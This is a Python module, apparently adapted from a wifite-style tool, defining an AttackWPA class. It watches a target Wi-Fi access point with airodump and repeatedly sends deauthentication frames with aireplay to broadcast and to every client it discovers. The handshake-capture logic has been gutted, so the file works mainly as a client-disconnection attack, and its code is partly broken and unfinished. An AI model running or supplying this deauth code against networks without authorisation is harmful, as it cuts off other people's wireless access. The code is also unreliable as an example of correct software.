#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
import time
import os
import re
from shutil import copy


class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        """Initiates full WPA handshake capture attack."""

        # Skip if target is not WPS
        if Configuration.wps_only and self.target.wps is False:
            Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}'
                     % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

    # TODO Rename this here and in `run`
    def _extracted_from_run_30(self, arg0):
        Color.pl(arg0)
        self.success = False
        return False

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:
                          
            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'WIFI Deauthenticator', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []
       

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)


            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'WIFI Deauthenticator',
                              'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  len(self.clients), deauth_timer, timeout_timer))
               
                # There is no handshake
                handshake = None

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'WIFI Deauthenticator',
                                      'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WIFI Deauthenticator {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            pass

        return handshake


    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """
        if Configuration.no_deauth:
            return

        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'WIFI Deauthenticator',
                          'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target

    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2' \
             ',        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
    Configuration.exit_gracefully(0)
